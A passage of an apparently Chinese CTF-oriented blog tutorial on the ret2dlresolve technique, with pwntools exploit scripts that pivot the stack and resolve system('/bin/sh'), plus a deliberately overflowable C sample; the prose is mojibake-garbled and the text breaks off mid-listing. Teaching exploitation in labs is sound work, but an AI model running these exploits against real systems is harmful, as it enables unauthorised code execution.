      <p>è¿™é‡Œä¸€èˆ¬åªèƒ½é€šè¿‡ä½¿ç”¨ä»»æ„å†™æ¥ä¿®æ”¹ï¼Œæˆ–è€…å¯ä»¥å€ŸåŠ©readå‡½æ•°æ ˆè¿ç§»ä¿®æ”¹rbpæ¥åŠ«æŒï¼Œå°†è¯¥æŒ‡é’ˆä¿®æ”¹ä¸ºæˆ‘ä»¬å†™å…¥çš„system_strçš„åœ°å€å‡å»0x11å¤„ï¼Œä¸€èˆ¬éƒ½æ˜¯è¿™æ ·çš„ï¼Œé‡è½½readå‡½æ•°ä¸ºsystemå‡½æ•°ï¼Œå› ä¸ºreadå‡½æ•°ä¸€èˆ¬éƒ½ä¼šæœ‰ã€‚</p>

        <h3 id="3-é‡è½½å‡½æ•°"   >
          <a href="#3-é‡è½½å‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-é‡è½½å‡½æ•°" class="headerlink" title="(3)é‡è½½å‡½æ•°"></a>(3)é‡è½½å‡½æ•°</h3>
      <p>æŸ¥æ‰¾é‡è½½çš„pltè¿›è¡Œè°ƒç”¨å³å¯ï¼Œåœ¨IDAä¸­<code>ctrl+s</code>å³å¯</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211212165518.png" alt="image-20211212165518078"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">strtab_addr = <span class="number">0x600A08</span></span><br><span class="line">command_addr = <span class="number">0x600C00</span></span><br><span class="line">system_str_addr = command_addr + <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ret2dlresolve</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4007d3</span></span><br><span class="line">plt0 = <span class="number">0x4004E0</span></span><br><span class="line"><span class="comment">#command_addrå³binsh_addr</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x38</span> + p64(pop_rdi_ret) + p64(command_addr) + p64(plt0) + \</span><br><span class="line">    p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-Partial-RELROæ¨¡å¼"   >
          <a href="#2-Partial-RELROæ¨¡å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Partial-RELROæ¨¡å¼" class="headerlink" title="2.Partial RELROæ¨¡å¼"></a>2.Partial RELROæ¨¡å¼</h2>
      <p>è¿™ç§æ¨¡å¼æœ‰å¥½å‡ ä¸ªåŒºåˆ†åº¦</p>

        <h3 id="1-åŸç”Ÿæ€çš„32ä½"   >
          <a href="#1-åŸç”Ÿæ€çš„32ä½" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-åŸç”Ÿæ€çš„32ä½" class="headerlink" title="(1)åŸç”Ÿæ€çš„32ä½"></a>(1)åŸç”Ÿæ€çš„32ä½</h3>
      <p>å³åœ¨32ä½æ¶æ„æœºå™¨ä¸Šç¼–è¯‘çš„32ä½ç¨‹åºï¼Œç›´æ¥å€ŸåŠ©å·¥å…·ä¸€æŠŠæ¢­å“ˆå³å¯ï¼Œè¯¦è§<code>SecconCTF2021-kasu_bof</code></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span>():</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">if</span> args.REMOTE:</span><br><span class="line">        p = process(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line">        <span class="comment">#p = remote(&#x27;hiyoko.quals.seccon.jp&#x27;, 9001)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = elf.process()</span><br><span class="line"></span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">dl_resolve = Ret2dlresolvePayload(elf, <span class="string">&quot;system&quot;</span>, [<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line"></span><br><span class="line">r = ROP(elf)</span><br><span class="line">r.gets(dl_resolve.data_addr)</span><br><span class="line">r.ret2dlresolve(dl_resolve)</span><br><span class="line"></span><br><span class="line">start()</span><br><span class="line"></span><br><span class="line">off_eip = <span class="number">0x88</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span>*(off_eip) + r.chain())</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(dl_resolve.payload)</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></div></figure>

<p>å¦‚æœæ¢æˆäº†readå‡½æ•°ï¼Œç›´æ¥æ›´æ”¹ä¸º<code>r.read(0,dl_resolve.data_addr,0x400)</code>å³å¯</p>
<p>è¯»å–ä¹‹åè¿”å›åˆ°plt0ï¼Œä¹‹ååŠ«æŒæ ˆä¸Šæ•°æ®</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211216141616.png" alt="image-20211216141615732"></p>
<p>é€šè¿‡fake_Elf32_Rel_addræ¥è·å–åˆ°fake_Elf32_Sym_addrè¿›è¡Œé‡è½½ï¼Œåœ¨ä¹‹åçš„<code>_dl_fixup</code>å‡½æ•°ä¸­é‡è½½ç›¸å…³å‡½æ•°ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211216141923.png" alt="image-20211216141922860"></p>
<p>è¿›å…¥systemå‡½æ•°</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211216142212.png" alt="image-20211216142029092"></p>
<p>å³å¯è°ƒç”¨system(â€˜/bin/shâ€™)</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211216142226.png" alt="image-20211216142052187"></p>

        <h3 id="2-64ä½æœºå™¨ç¼–è¯‘çš„32ä½ç¨‹åº"   >
          <a href="#2-64ä½æœºå™¨ç¼–è¯‘çš„32ä½ç¨‹åº" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-64ä½æœºå™¨ç¼–è¯‘çš„32ä½ç¨‹åº" class="headerlink" title="(2)64ä½æœºå™¨ç¼–è¯‘çš„32ä½ç¨‹åº"></a>(2)64ä½æœºå™¨ç¼–è¯‘çš„32ä½ç¨‹åº</h3>
      <ul>
<li>æº¢å‡ºé•¿åº¦è¶³å¤Ÿ</li>
<li>å­˜åœ¨å¯ä»¥è¾“å…¥æ•°æ®çš„bssæ®µ</li>
</ul>
<p>è¿™ç§æƒ…å†µä¸€èˆ¬éœ€è¦ä¸€ä¸ªæˆ‘ä»¬èƒ½å¤Ÿå°†æ•°æ®è¾“å…¥åˆ°bssæ®µçš„åŠŸèƒ½ï¼Œä»è€Œèƒ½å¤Ÿç›´æ¥åŠ«æŒæ ˆã€‚åŸå› å°±æ˜¯åœ¨è¿™ç§æƒ…å†µä¸‹åŒä¸€æ®µä»£ç ç¼–è¯‘ä¹‹åä¼šå‡ºç°ä¸åŒçš„æ•ˆæœï¼Œä»£ç ä¸ºï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">0x500</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> dest[<span class="number">0x10</span>];</span><br><span class="line">    <span class="comment">//gets(buf);</span></span><br><span class="line">    <span class="keyword">int</span> n = read(<span class="number">0</span>,buf,<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(dest,buf,<span class="number">0x500</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘ åŸç”Ÿæ€32ä½æ•ˆæœ"   >
          <a href="#â‘ åŸç”Ÿæ€32ä½æ•ˆæœ" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åŸç”Ÿæ€32ä½æ•ˆæœ" class="headerlink" title="â‘ åŸç”Ÿæ€32ä½æ•ˆæœ"></a>â‘ åŸç”Ÿæ€32ä½æ•ˆæœ</h4>
      <p>è¿™ä¸ªç¯å¢ƒä¸­</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211213105826.png" alt="image-20211213105819379"></p>

        <h4 id="â‘¡64ä½æœºå™¨ç¼–è¯‘32ä½ç¨‹åºæ•ˆæœ"   >
          <a href="#â‘¡64ä½æœºå™¨ç¼–è¯‘32ä½ç¨‹åºæ•ˆæœ" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡64ä½æœºå™¨ç¼–è¯‘32ä½ç¨‹åºæ•ˆæœ" class="headerlink" title="â‘¡64ä½æœºå™¨ç¼–è¯‘32ä½ç¨‹åºæ•ˆæœ"></a>â‘¡64ä½æœºå™¨ç¼–è¯‘32ä½ç¨‹åºæ•ˆæœ</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211213110012.png" alt="image-20211213110012402"></p>
<p>ç›¸æ¯”è¾ƒåŸå…ˆçš„åŸç”Ÿæ€ï¼Œä¼šå¤šå‡ºæ¥ä¸€äº›æ±‡ç¼–ä»£ç ï¼Œæ¯”è¾ƒæ˜æ˜¾çš„å°±æ˜¯<code>lea     esp, [ecx-4]</code>ï¼Œè¿™ä¸ªè¯¦è§Migraineæ®‡å¸ˆå‚…çš„æ–‡ç« </p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/187875" >åœ¨PWNé¢˜ä¸­ç»•è¿‡lea espä»¥åŠå…³äºRet2dlçš„ä¸€äº›è¡¥å…… - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>æœ‰çš„æ—¶å€™ä¹Ÿä¼šç¼–è¯‘å‡ºå¦‚ä¸‹ä»£ç </p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211213205820.png" alt="image-20211213205819971"></p>
<p>è¿™æ—¶å€™å°±éœ€è¦æˆ‘ä»¬çµæ´»å˜é€šï¼Œé€šè¿‡ä¿®æ”¹æ ˆä¸Šçš„æ•°æ®ï¼Œè¿›è€Œæ§åˆ¶ecxï¼Œå†æ§åˆ¶espï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥æ ˆè¿ç§»ï¼Œä»è€Œåœ¨æˆ‘ä»¬å­˜æ”¾æ•°æ®çš„åœ°æ–¹è¿›è¡ŒROPã€‚</p>

        <h4 id="â‘¢é€šè¿‡ecxåŠ«æŒesp"   >
          <a href="#â‘¢é€šè¿‡ecxåŠ«æŒesp" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¢é€šè¿‡ecxåŠ«æŒesp" class="headerlink" title="â‘¢é€šè¿‡ecxåŠ«æŒesp"></a>â‘¢é€šè¿‡ecxåŠ«æŒesp</h4>
      <p>å³å¦‚ä¸‹å…ˆåŠ«æŒæ ˆåˆ°å­˜æ”¾æ•°æ®çš„bssæ®µ</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">dl_resolve = Ret2dlresolvePayload(elf, <span class="string">&quot;system&quot;</span>, [<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line">r = ROP(elf)</span><br><span class="line"><span class="comment">#r.read(0,dl_resolve.data_addr,0x400)</span></span><br><span class="line">r.gets(dl_resolve.data_addr)</span><br><span class="line">r.ret2dlresolve(dl_resolve)</span><br><span class="line"></span><br><span class="line">stack_space = <span class="number">0x280</span></span><br><span class="line">offset_ebp = <span class="number">0x28</span></span><br><span class="line">buf_addr = <span class="number">0x0804A040</span></span><br><span class="line">ROP_chain_addr = buf_addr + stack_space</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&quot;A&quot;</span>*(offset_ebp - <span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#pop ecxçš„æ—¶å€™espæŒ‡å‘è¯¥åœ°å€ï¼Œå°†è¯¥åœ°å€èµ‹ç»™ecxï¼Œä»è€Œé€šè¿‡lea esp,[ecx-4]åŠ«æŒesp</span></span><br><span class="line">payload += p32(ROP_chain_addr + <span class="number">0x4</span>)</span><br><span class="line">payload = payload.ljust(stack_space,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += r.chain()</span><br></pre></td></tr></table></div></figure>

<p>è¿™æ ·å°±èƒ½é€šè¿‡ecxæ§åˆ¶espï¼Œä»è€Œè·³è½¬åˆ°æˆ‘ä»¬ä½äºbssæ®µä¸Šçš„ROPé“¾</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211213215116.png" alt="image-20211213215116117"></p>
<p>ä¹‹åå°±æ˜¯ç±»ä¼¼çš„äº†ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211216143113.png" alt="image-20211216142835635"></p>
<p>æ‰¾åˆ°systemå‡½æ•°</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211216143131.png" alt="image-20211216142921537"></p>
<p>è°ƒç”¨å¯¹åº”system(â€˜/bin/shâ€™)</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211216143225.png" alt="image-20211216143224584"></p>

        <h4 id="ğŸ”ºæ³¨"   >
          <a href="#ğŸ”ºæ³¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ³¨" class="headerlink" title="ğŸ”ºæ³¨"></a>ğŸ”ºæ³¨</h4>
      <p>ä½†æ˜¯è¿™é‡Œå°±ä¼šæœ‰ç‚¹ä¸å¤ªå¥½ï¼Œå°±æ˜¯å¦‚æœåŠ«æŒä¹‹åçš„espå°±åœ¨bufé¦–åœ°å€é™„è¿‘ï¼Œé‚£ä¹ˆåœ¨ä¹‹åçš„é‡å®šå‘è¿‡ç¨‹ä¸­ï¼Œä¼šè°ƒç”¨ä¸€ç³»åˆ—å‡½æ•°ï¼Œé‚£ä¹ˆåœ¨ç”Ÿæˆå‡½æ•°æ ˆç©ºé—´çš„æ—¶å€™æ ˆé¡¶å°±ä¼šä¸€ç›´å‘ä¸Šç§»åŠ¨ï¼Œä»è€Œè¦†ç›–åˆ°ä¸èƒ½è¦†ç›–çš„åœ°æ–¹ï¼Œå¯¼è‡´å‡ºé”™</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211213214636.png" alt="image-20211213214635928"></p>
<p>å¯ä»¥çœ‹åˆ°è¯¥åœ°å€å·²ç»åœ¨å­˜æ”¾é‡å®šå‘è¡¨çš„LOADæ®µäº†ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211213214834.png" alt="image-20211213214833969"></p>
<p>æ‰€ä»¥æˆ‘ä»¬ä¹‹å‰å°±è®¾ç½®äº†å­˜æ”¾ROPé“¾çš„æ•°æ®åœ¨bssæ®µé¦–åœ°å€å¤§çº¦0x280çš„åœ°æ–¹ï¼Œè¿™æ ·åŸºæœ¬å°±ä¸ä¼šè¦†ç›–äº†ï¼Œå…¶å®æœ€å¥½èƒ½å¤Ÿå†é•¿å°±å†é•¿ä¸€äº›ï¼Œä¹Ÿä¸ä¼šæœ‰ä»€ä¹ˆåå¤„ã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stack_space = <span class="number">0x280</span></span><br><span class="line">buf_addr = <span class="number">0x0804A040</span></span><br><span class="line">ROP_chain_addr = buf_addr + stack_space</span><br></pre></td></tr></table></div></figure>

<p>å®Œæ•´expå¦‚ä¸‹</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2dl_re32_gets&quot;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&quot;./ret2dl_re32_gets&quot;</span>)</span><br><span class="line">plt0_addr = elf.get_section_by_name(<span class="string">&quot;.plt&quot;</span>)[<span class="string">&quot;sh_addr&quot;</span>]</span><br><span class="line"></span><br><span class="line">dynstr_addr, dynsym_addr, relplt_addr = <span class="built_in">map</span>(elf.dynamic_value_by_tag,</span><br><span class="line">                                                      [<span class="string">&quot;DT_STRTAB&quot;</span>, <span class="string">&quot;DT_SYMTAB&quot;</span>, <span class="string">&quot;DT_JMPREL&quot;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;plt0:&quot;</span>, <span class="built_in">hex</span>(plt0_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;.dynstr:&quot;</span>, <span class="built_in">hex</span>(dynstr_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;.dynsym:&quot;</span>, <span class="built_in">hex</span>(dynsym_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;.rel.plt:&quot;</span>, <span class="built_in">hex</span>(relplt_addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdb_a</span>(<span class="params">addr</span>):</span></span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *&#123;0&#125; \n c&quot;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dl_resolve = Ret2dlresolvePayload(elf, <span class="string">&quot;system&quot;</span>, [<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line">r = ROP(elf)</span><br><span class="line"><span class="comment">#r.read(0,dl_resolve.data_addr,0x400)</span></span><br><span class="line">r.gets(dl_resolve.data_addr)</span><br><span class="line">r.ret2dlresolve(dl_resolve)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># .text:0804846E                 lea     esp, [ebp-10h]</span></span><br><span class="line"><span class="comment"># .text:08048471                 pop     ecx</span></span><br><span class="line"><span class="comment"># .text:08048472                 pop     ebx</span></span><br><span class="line"><span class="comment"># .text:08048473                 pop     esi</span></span><br><span class="line"><span class="comment"># .text:08048474                 pop     edi</span></span><br><span class="line"><span class="comment"># .text:08048475                 pop     ebp</span></span><br><span class="line"><span class="comment"># .text:08048476                 lea     esp, [ecx-4]</span></span><br><span class="line"><span class="comment"># .text:08048479                 retn</span></span><br><span class="line"><span class="comment">#ç”±äºä¼šåŠ«æŒespåˆ°bufå¤„ï¼Œæ‰€ä»¥æœ€å¥½ç•™å‡ºå¤§çº¦0x280æˆ–ä»¥ä¸Šçš„ç©ºé—´æ¥ä¸ºé‡å®šå‘çš„ä¸€ç³»åˆ—å‡½æ•°</span></span><br><span class="line"><span class="comment">#ç•™å‡ºæ ˆç©ºé—´ï¼Œä¸ç„¶å°±å¯èƒ½ä¼šä½¿å¾—espæ”¾åˆ°bufæ®µä¸Šé¢ï¼Œè¦†ç›–åˆ°ä¸èƒ½è¦†ç›–çš„åœ°æ–¹</span></span><br><span class="line">stack_space = <span class="number">0x280</span></span><br><span class="line">offset_ebp = <span class="number">0x28</span></span><br><span class="line">buf_addr = <span class="number">0x0804A040</span></span><br><span class="line">ROP_chain_addr = buf_addr + stack_space</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&quot;A&quot;</span>*(offset_ebp - <span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#pop ecxçš„æ—¶å€™espæŒ‡å‘è¯¥åœ°å€ï¼Œå°†è¯¥åœ°å€èµ‹ç»™ecxï¼Œä»è€Œé€šè¿‡lea esp,[ecx-4]åŠ«æŒesp</span></span><br><span class="line">payload += p32(ROP_chain_addr + <span class="number">0x4</span>)</span><br><span class="line">payload = payload.ljust(stack_space,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += r.chain()</span><br><span class="line"></span><br><span class="line">gdb_a(<span class="number">0x08048464</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(dl_resolve.payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-åŸç”Ÿæ€64ä½"   >
          <a href="#3-åŸç”Ÿæ€64ä½" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-åŸç”Ÿæ€64ä½" class="headerlink" title="(3)åŸç”Ÿæ€64ä½"></a>(3)åŸç”Ÿæ€64ä½</h3>
      <p>è¿™ä¸ªå°±æ¯”è¾ƒæ­£å¸¸äº†ï¼Œä¸€èˆ¬æ˜¯ä¸¤ç§æ¨¡å¼</p>

        <h4 id="â‘ æœ‰readå’Œæ³„éœ²å‡½æ•°"   >
          <a href="#â‘ æœ‰readå’Œæ³„éœ²å‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ æœ‰readå’Œæ³„éœ²å‡½æ•°" class="headerlink" title="â‘ æœ‰readå’Œæ³„éœ²å‡½æ•°"></a>â‘ æœ‰readå’Œæ³„éœ²å‡½æ•°</h4>
      <p>è¿™ä¸ªå°±æ˜¯æœ€æ­£å¸¸çš„ret2dl_resolveï¼Œç›´æ¥æ‹¿æ¨¡æ¿æ‰“å³å¯ï¼Œå‚ç…§bsauceå¸ˆå‚…çš„æ¨¡æ¿</p>
<p>ä¸è¿‡è¿™ä¸ªreadæ¢æˆgetså¥½åƒä¸å¤ªå¥½ä½¿ï¼Œä¹Ÿå¯èƒ½æ˜¯æ²¡è®¾ç½®å¥½ï¼Œ<strong>å›å¤´è¯•è¯•</strong></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5722#toc-2" >32ä½/64ä½dlresolveæœ€å…¨æ€»ç»“ï¼ˆä¸ç”¨æ³„éœ²åœ°å€-æ‰§è¡Œone_gadgetï¼‰ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span 